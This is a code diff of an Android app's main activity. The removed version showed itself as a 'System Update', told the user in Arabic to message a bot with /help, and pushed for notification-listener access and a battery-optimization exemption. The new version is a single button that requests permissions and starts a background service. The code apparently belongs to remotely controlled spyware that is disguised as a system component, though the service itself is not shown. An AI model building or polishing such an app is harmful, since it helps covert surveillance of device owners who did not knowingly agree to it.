@@ -4,10 +4,7 @@ import android.Manifest;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.provider.Settings;
 import android.widget.Button;
-import android.widget.LinearLayout;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
@@ -27,34 +24,20 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        LinearLayout layout = new LinearLayout(this);
-        layout.setOrientation(LinearLayout.VERTICAL);
-        layout.setPadding(50, 100, 50, 50);
-        
-        TextView tvStatus = new TextView(this);
-        tvStatus.setText("⚙️ System Update\n\nالخدمة تعمل\nارسل /help للبوت");
-        tvStatus.setTextSize(16);
-        
-        Button btnPermissions = new Button(this);
-        btnPermissions.setText("🔓 إعطاء الصلاحيات");
-        btnPermissions.setOnClickListener(v -> {
+        Button btn = new Button(this);
+        btn.setText("🔓 إعطاء الصلاحيات وبدء الخدمة");
+        btn.setOnClickListener(v -> {
             for (String permission : permissions) {
                 if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                     ActivityCompat.requestPermissions(this, new String[]{permission}, 100);
                 }
             }
-            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-            startActivity(intent);
-            Toast.makeText(this, "جاري فتح الصلاحيات", Toast.LENGTH_LONG).show();
+            Toast.makeText(this, "تم طلب الصلاحيات", Toast.LENGTH_LONG).show();
+            startService(new Intent(this, MainService.class));
         });
         
-        layout.addView(tvStatus);
-        layout.addView(btnPermissions);
-        setContentView(layout);
+        setContentView(btn);
         
         startService(new Intent(this, MainService.class));
-        startService(new Intent(this, NotificationService.class));
     }
 }
